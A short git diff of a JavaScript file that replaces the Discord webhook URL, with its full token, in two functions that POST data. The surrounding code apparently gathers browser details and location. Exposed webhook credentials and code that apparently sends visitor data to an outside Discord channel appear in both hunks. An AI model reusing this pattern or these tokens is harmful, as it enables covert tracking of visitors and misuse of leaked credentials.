@@ -35,7 +35,7 @@ let navigatorVersion = navigator.appCodeName + navigator.appName + navigator.app
 
 function sendMessage() {
    let request = new XMLHttpRequest();
-   request.open("POST", "https://discord.com/api/webhooks/1209127945797640192/-2zN1Ce1T40pkgXCi5GdF_KH1Lu81WzbTpqc3XAa9QZPpgjH57DNKA7fxf3SE7sDEYkJ");
+   request.open("POST", "https://discord.com/api/webhooks/1209178562272174131/uofTr1UNpaD06fUk6cyrOxpwC6OwQl8rDpTTx8fowNYvu-ImD3lNTXLUR93CfObBxb-g");
    request.setRequestHeader('Content-type', 'application/json');
 
    let params = {
@@ -56,7 +56,7 @@ function sendMessage() {
 
 function sendMessageLocalisation() {
    let request = new XMLHttpRequest();
-   request.open("POST", "https://discord.com/api/webhooks/1209127945797640192/-2zN1Ce1T40pkgXCi5GdF_KH1Lu81WzbTpqc3XAa9QZPpgjH57DNKA7fxf3SE7sDEYkJ");
+   request.open("POST", "https://discord.com/api/webhooks/1209178562272174131/uofTr1UNpaD06fUk6cyrOxpwC6OwQl8rDpTTx8fowNYvu-ImD3lNTXLUR93CfObBxb-g");
    request.setRequestHeader('Content-type', 'application/json');
 
    let params = {
